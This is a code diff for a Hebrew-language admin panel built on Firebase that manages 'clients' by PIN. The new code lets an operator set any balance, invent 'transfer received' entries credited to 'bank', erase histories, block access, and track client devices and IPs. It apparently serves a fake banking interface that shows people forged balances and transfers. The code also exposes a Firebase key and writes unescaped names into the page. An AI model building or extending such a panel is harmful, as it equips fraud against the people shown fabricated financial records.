@@ -20,13 +20,37 @@ input,select,textarea{width:100%;padding:9px 10px;border:1px solid var(--b);bord
 textarea{resize:vertical;min-height:60px}
 .btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600;font-family:'Inter',sans-serif}
 .btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer;font-family:'Inter',sans-serif}
+.btn-danger{background:#dc2626;color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600;font-family:'Inter',sans-serif}
+.btn-primary{background:#2563eb;color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600;font-family:'Inter',sans-serif}
+.btn-sm{padding:4px 10px;font-size:11px}
 table{width:100%;border-collapse:collapse;font-size:12px}
 th,td{padding:9px;border-bottom:1px solid var(--b);text-align:right}
 th{background:#fafafa;color:var(--m);font-weight:600}
 .badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:10px}
 .badge-notif{background:#fef3c7;color:#92400e;padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px}
 .badge-theme{padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px;color:#fff}
+.badge-online{background:#d1fae5;color:#065f46;padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px}
+.badge-offline{background:#fee2e2;color:#991b1b;padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px}
 h3{font-size:15px}
+.action-btns{display:flex;gap:4px;flex-wrap:wrap}
+.action-btns button{font-size:10px;padding:4px 8px;border-radius:4px;border:1px solid var(--b);background:#fff;cursor:pointer;font-family:inherit}
+.action-btns .edit-btn{color:var(--p);border-color:#f3e8ff;background:#f3e8ff}
+.action-btns .sessions-btn{color:#2563eb;border-color:#dbeafe;background:#eff6ff}
+.action-btns .del-btn{color:#dc2626;border-color:#fee2e2;background:#fef2f2}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center;padding:20px}
+.modal.active{display:flex}
+.modal-content{background:#fff;border-radius:12px;max-width:700px;width:100%;max-height:80vh;overflow-y:auto;padding:24px}
+.modal-close{float:left;background:none;border:none;font-size:24px;cursor:pointer;color:var(--m)}
+.modal-close:hover{color:#111}
+.session-item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--b);align-items:center}
+.session-item:last-child{border-bottom:none}
+.session-item .device{font-weight:600}
+.session-item .ip{color:var(--m);font-size:13px}
+.session-item .time{color:var(--m);font-size:12px}
+.session-item .status{font-size:12px;font-weight:600}
+.session-item .status.online{color:#059669}
+.session-item .status.offline{color:#dc2626}
+.modal-actions{margin-top:16px;display:flex;gap:10px;justify-content:flex-end}
 </style>
 </head>
 <body>
@@ -36,6 +60,7 @@ h3{font-size:15px}
 </header>
 
 <div class="wrap">
+  <!-- ===== CARTE CRÉER / MODIFIER ===== -->
   <div class="card">
     <h3 style="margin:0 12px">צור / ערוך לקוח</h3>
     <div class="grid">
@@ -64,24 +89,27 @@ h3{font-size:15px}
     <p style="font-size:11px;color:var(--m);margin-top:8px">💡 להגדלה: השאר את "סכום התחלתי" ריק ומלא "הוסף לסכום". לדוגמה: 500 קיים + 500 נוסף = 1000 בהיסטוריה</p>
   </div>
 
+  <!-- ===== CARTE CLIENTS ===== -->
   <div class="card">
     <h3 style="margin:0 0 10px">לקוחות רשומים</h3>
     <div style="overflow:auto">
       <table>
-        <thead><tr><th>לקוח</th><th>PIN</th><th>סכום</th><th>ערכה</th><th>קוד</th><th>%</th><th>פעולה</th></tr></thead>
+        <thead><tr><th>לקוח</th><th>PIN</th><th>סכום</th><th>סטטוס</th><th>ערכה</th><th>קוד</th><th>%</th><th>פעולה</th></tr></thead>
         <tbody id="tb"></tbody>
       </table>
     </div>
   </div>
 
+  <!-- ===== CARTE GESTION ACCÈS ===== -->
   <div class="card">
     <h3 style="margin:0 12px">חסום או בטל חסימת גישת לקוח</h3>
     <label>בחר גישת לקוח. <span style="color:var(--r)">נדרש</span></label>
     <select id="clientAccess" style="margin-bottom:12px"></select>
-    <button class="btn" id="blockBtn" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 חסום גישת לקוח</button>
+    <button class="btn-danger" id="blockBtn" style="width:100%;margin-bottom:8px">🔒 חסום גישת לקוח</button>
     <button class="btn" id="unblockBtn" style="width:100%;background:#059669">🔓 בטל חסימת לקוח</button>
   </div>
 
+  <!-- ===== CARTE ACTIONS AVANCÉES ===== -->
   <div class="card">
     <h3 style="margin:0 12px">פעולות על גישת לקוח</h3>
     <label>בחר גישת לקוח. <span style="color:var(--r)">נדרש</span></label>
@@ -91,13 +119,27 @@ h3{font-size:15px}
       <option>אפס היסטוריית העברות</option>
       <option>מחק התראה</option>
     </select>
-    <button class="btn" id="actionBtn" style="width:100%;background:#2563eb">בצע פעולה ←</button>
+    <button class="btn-primary" id="actionBtn" style="width:100%">בצע פעולה ←</button>
   </div>
 </div>
 
+<!-- ===== MODAL SESSIONS ===== -->
+<div id="sessionsModal" class="modal">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeSessionsModal()">✕</button>
+    <h3><i class="fas fa-wifi"></i> מפגשים פעילים</h3>
+    <div id="sessionsList"></div>
+    <div class="modal-actions">
+      <button class="btn-danger btn-sm" onclick="forceDisconnect()"><i class="fas fa-power-off"></i> נתק את כל המכשירים</button>
+      <button class="btn2 btn-sm" onclick="closeSessionsModal()">סגור</button>
+    </div>
+  </div>
+</div>
+
+<!-- ========== SCRIPTS (MODIFIED) ========== -->
 <script type="module">
 import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-import {getDatabase, ref, push, onValue, remove, update} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+import {getDatabase, ref, push, onValue, remove, update, get, set} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyAysxCgaEceZgyDu1TB7B40lwNdDMIIajg",
@@ -115,10 +157,37 @@ const clientsRef = ref(db, 'clients');
 
 let data = {};
 let editId = null;
+let currentClientIdForSessions = null;
 
 const $ = id => document.getElementById(id);
 $('pct').oninput = () => $('pv').textContent = $('pct').value;
 
+// ===== GÉNÉRATEUR D'ID =====
+function genId(prefix){
+  return prefix + Math.floor(1000000000 + Math.random() * 9000000);
+}
+
+// ===== AJOUT TRANSACTION DE CRÉDIT =====
+async function addCreditTransaction(clientId, amount, devise = '₪'){
+  if(amount <= 0) return;
+  const now = new Date();
+  const tx = {
+    id: genId('CR'),
+    title: 'העברה שהתקבלה',
+    subtitle: 'בנק',
+    amount: amount,
+    beneficiary: 'בנק',
+    iban: '-',
+    devise: devise,
+    date: now.toLocaleDateString('he-IL'),
+    time: now.toLocaleTimeString('he-IL', {hour:'2-digit', minute:'2-digit'}),
+    timestamp: now.getTime()
+  };
+  await push(ref(db, 'clients/' + clientId + '/history'), tx);
+  return tx;
+}
+
+// ===== CHARGEMENT DES DONNÉES =====
 onValue(clientsRef, snap => {
   data = snap.val() || {};
   if(Object.keys(data).length === 0){
@@ -136,12 +205,15 @@ onValue(clientsRef, snap => {
       adresse: '',
       tel: '',
       notification: '',
-      created: Date.now()
+      created: Date.now(),
+      lastCreditAmount: 10000
     });
   }
   render();
+  updateAllStatuses();
 });
 
+// ===== RENDU TABLEAU =====
 function getThemeBadge(theme){
   const colors = {purple:'#6A0DAD',blue:'#2563eb',yellow:'#eab308'};
   const names = {purple:'סגול',blue:'כחול',yellow:'צהוב'};
@@ -149,29 +221,83 @@ function getThemeBadge(theme){
 }
 
 function render(){
-  const rows = Object.entries(data).map(([id,v]) => `
-    <tr>
-      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[חסום]</span>':''}${v.notification?'<span class="badge-notif">🔔</span>':''}</span></td>
+  const rows = Object.entries(data).map(([id,v]) => {
+    const blockedBadge = v.blocked ? ' <span style="color:#dc2626;font-weight:700">[חסום]</span>' : '';
+    const notifBadge = v.notification ? '<span class="badge-notif">🔔</span>' : '';
+    return `
+    <tr id="row-${id}">
+      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${blockedBadge}${notifBadge}</span></td>
       <td><span class="badge">${v.pin}</span></td>
       <td>${Number(v.montant).toLocaleString('he-IL')} ${v.devise||'₪'}</td>
+      <td id="status-${id}"><span class="badge-offline">מתנתק</span></td>
       <td>${getThemeBadge(v.theme||'purple')}</td>
       <td>${v.code}</td>
       <td>${v.pct}%</td>
       <td>
-        <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:10px;font-family:'Inter',sans-serif">ערוך</button>
-        <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:10px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-right:4px;font-family:'Inter',sans-serif">מחק</button>
+        <div class="action-btns">
+          <button class="edit-btn" onclick="editClient('${id}')">ערוך</button>
+          <button class="sessions-btn" onclick="openSessions('${id}')">📱 מפגשים</button>
+          <button class="del-btn" onclick="delClient('${id}')">מחק</button>
+        </div>
       </td>
-    </tr>`).join('');
-  $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:20px">אין לקוחות</td></tr>';
+    </tr>`;
+  }).join('');
+  $('tb').innerHTML = rows || '<tr><td colspan="8" style="text-align:center;color:#888;padding:20px">אין לקוחות</td></tr>';
+  refreshLists();
 }
 
-$('saveBtn').onclick = () => {
+// ===== MISE À JOUR DES STATUTS =====
+async function updateAllStatuses(){
+  for(const id of Object.keys(data)){
+    const snap = await get(ref(db, 'clients/' + id + '/sessions'));
+    let active = 0;
+    if(snap.exists()){
+      const sessions = Object.values(snap.val());
+      active = sessions.filter(s => s.connected === true).length;
+    }
+    const cell = document.getElementById('status-'+id);
+    if(cell){
+      if(active > 0){
+        cell.innerHTML = `<span class="badge-online">🟢 ${active} מכשיר${active > 1 ? 'ים' : ''} מחובר${active > 1 ? 'ים' : ''}</span>`;
+      } else {
+        cell.innerHTML = `<span class="badge-offline">🔴 מנותק</span>`;
+      }
+    }
+  }
+}
+// Écouter les changements de sessions pour chaque client
+Object.keys(data).forEach(id => {
+  const sessionsRef = ref(db, 'clients/' + id + '/sessions');
+  onValue(sessionsRef, () => updateAllStatuses());
+});
+
+// ===== SAUVEGARDE (avec création transaction) =====
+$('saveBtn').onclick = async () => {
   const addAmt = Number($('addMontant').value)||0;
   let finalMontant = Number($('montant').value)||0;
+  let creditTransaction = null;
+  let oldMontant = 0;
 
-  if(editId && addAmt > 0 && data[editId]){
-    const currentMontant = Number(data[editId].montant)||0;
-    finalMontant = currentMontant + addAmt;
+  if(editId && data[editId]){
+    oldMontant = Number(data[editId].montant)||0;
+  }
+
+  if(addAmt > 0){
+    if(editId && data[editId]){
+      finalMontant = oldMontant + addAmt;
+    } else {
+      finalMontant = addAmt;
+    }
+    creditTransaction = { amount: addAmt, devise: $('devise').value };
+  } else if(editId && data[editId]){
+    if(finalMontant > oldMontant){
+      const diff = finalMontant - oldMontant;
+      creditTransaction = { amount: diff, devise: $('devise').value };
+    }
+  } else {
+    if(finalMontant > 0){
+      creditTransaction = { amount: finalMontant, devise: $('devise').value };
+    }
   }
 
   const o = {
@@ -191,19 +317,30 @@ $('saveBtn').onclick = () => {
     updated: Date.now()
   };
 
-  if(!o.nom ||!o.email ||!o.pin){ alert('שם, אימייל ו-PIN חובה'); return; }
+  if(!o.nom || !o.email || !o.pin){
+    alert('שם, אימייל ו-PIN חובה');
+    return;
+  }
+
+  let clientId = editId;
 
   if(editId){
-    update(ref(db, 'clients/'+editId), o);
-    if(addAmt > 0){
-      alert(`הסכום הוגדל ב-${addAmt} ${o.devise}. יתרה חדשה: ${finalMontant} ${o.devise}. ההיסטוריה עודכנה ב-FLOA BK.`);
+    await update(ref(db, 'clients/' + editId), o);
+    if(creditTransaction){
+      await addCreditTransaction(editId, creditTransaction.amount, creditTransaction.devise);
+      await update(ref(db, 'clients/' + editId), { lastCreditAmount: finalMontant });
     }
+    alert(`לקוח עודכן. יתרה חדשה: ${finalMontant} ${o.devise}.`);
   } else {
-    push(clientsRef, {...o, created: Date.now()});
+    const newRef = push(clientsRef, {...o, created: Date.now(), lastCreditAmount: finalMontant});
+    clientId = newRef.key;
+    if(creditTransaction && creditTransaction.amount > 0){
+      await addCreditTransaction(clientId, creditTransaction.amount, creditTransaction.devise);
+    }
+    alert('לקוח חדש נוצר. ערכה: ' + o.theme);
   }
 
   resetForm();
-  if(!addAmt) alert('לקוח נשמר. ערכה: ' + o.theme);
 };
 
 $('resetBtn').onclick = resetForm;
@@ -213,6 +350,7 @@ function resetForm(){
   $('devise').value='₪'; $('theme').value='purple'; $('pct').value=100; $('pv').textContent='100'; editId=null;
 }
 
+// ===== ÉDITION =====
 window.editClient = (id) => {
   const v = data[id]; editId = id;
   $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
@@ -224,20 +362,21 @@ window.editClient = (id) => {
   window.scrollTo({top:0,behavior:'smooth'});
 };
 
+// ===== SUPPRESSION =====
 window.delClient = (id) => {
   if(confirm('למחוק לקוח זה? הוא לא יוכל להתחבר יותר.')){
     remove(ref(db, 'clients/'+id));
   }
 };
 
+// ===== LISTES DÉROULANTES =====
 function refreshLists(){
-  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'₪'})${v.blocked?' (חסום)':''}${v.notification?' 🔔':''}</option>`).join('');
+  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'₪'})${v.blocked?' [חסום]':''}${v.notification?' 🔔':''}</option>`).join('');
   if($('clientAccess')) $('clientAccess').innerHTML = opts;
   if($('clientAction')) $('clientAction').innerHTML = opts;
 }
-const _render = render;
-render = function(){ _render(); refreshLists(); };
 
+// ===== BLOQUER / DÉBLOQUER =====
 $('blockBtn').onclick = ()=>{
   const id = $('clientAccess').value;
   if(!id) return alert('בחר לקוח');
@@ -250,19 +389,98 @@ $('unblockBtn').onclick = ()=>{
   update(ref(db,'clients/'+id), {blocked:false, updated:Date.now()});
   alert('החסימה בוטלה');
 };
+
+// ===== ACTIONS AVANCÉES =====
 $('actionBtn').onclick = ()=>{
   const id = $('clientAction').value;
   const action = $('actionType').value;
   if(!id) return alert('בחר לקוח');
 
   if(action === 'אפס היסטוריית העברות'){
-    update(ref(db,'clients/'+id), {historyReset:Date.now()});
+    update(ref(db,'clients/'+id), {montant:0, lastCreditAmount:0, historyReset:Date.now()});
+    set(ref(db,'clients/'+id+'/history'), null);
     alert('ההיסטוריה אופסה - נמחקה ב-FLOA BK');
   } else if(action === 'מחק התראה'){
     update(ref(db,'clients/'+id), {notification:'', updated:Date.now()});
     alert('ההתראה נמחקה - הפעמון יציג "אין התראות"');
   }
 };
+
+// ===== MODAL SESSIONS =====
+window.openSessions = async (clientId) => {
+  currentClientIdForSessions = clientId;
+  document.getElementById('sessionsModal').classList.add('active');
+  await loadSessions(clientId);
+};
+
+window.closeSessionsModal = () => {
+  document.getElementById('sessionsModal').classList.remove('active');
+  currentClientIdForSessions = null;
+};
+
+async function loadSessions(clientId){
+  const container = document.getElementById('sessionsList');
+  const snap = await get(ref(db, 'clients/' + clientId + '/sessions'));
+  if(!snap.exists()){
+    container.innerHTML = '<p style="color:var(--m)">אין מפגשים רשומים.</p>';
+    return;
+  }
+  const sessions = Object.entries(snap.val());
+  if(sessions.length === 0){
+    container.innerHTML = '<p style="color:var(--m)">אין מפגשים.</p>';
+    return;
+  }
+  let html = '';
+  sessions.forEach(([key, s]) => {
+    const statusClass = s.connected ? 'online' : 'offline';
+    const statusText = s.connected ? 'מחובר' : 'מנותק';
+    const lastActivity = s.lastActivity ? new Date(s.lastActivity).toLocaleString('he-IL') : 'לא ידוע';
+    html += `
+      <div class="session-item">
+        <div>
+          <div class="device">📱 ${s.device || 'מכשיר לא ידוע'}</div>
+          <div class="ip">🌐 ${s.ip || 'IP לא ידוע'}</div>
+          <div class="time">⏱️ פעילות אחרונה: ${lastActivity}</div>
+        </div>
+        <div class="status ${statusClass}">${statusText}</div>
+      </div>
+    `;
+  });
+  container.innerHTML = html;
+}
+
+window.forceDisconnect = async () => {
+  if(!currentClientIdForSessions) return;
+  if(!confirm('לנתק את כל המכשירים של לקוח זה?')) return;
+
+  const snap = await get(ref(db, 'clients/' + currentClientIdForSessions + '/sessions'));
+  if(snap.exists()){
+    const sessions = snap.val();
+    const updates = {};
+    Object.keys(sessions).forEach(key => {
+      updates['clients/' + currentClientIdForSessions + '/sessions/' + key + '/connected'] = false;
+    });
+    await update(ref(db), updates);
+    alert('כל המכשירים נותקו.');
+    await loadSessions(currentClientIdForSessions);
+    updateAllStatuses();
+  }
+};
+
+// Fermer la modale en cliquant à l'extérieur
+document.getElementById('sessionsModal').addEventListener('click', (e) => {
+  if(e.target === e.currentTarget) closeSessionsModal();
+});
+
+// ===== INIT =====
+resetForm();
+
+// Exposer les fonctions pour les boutons onclick
+window.editClient = editClient;
+window.delClient = delClient;
+window.openSessions = openSessions;
+window.closeSessionsModal = closeSessionsModal;
+window.forceDisconnect = forceDisconnect;
 </script>
 </body>
 </html>
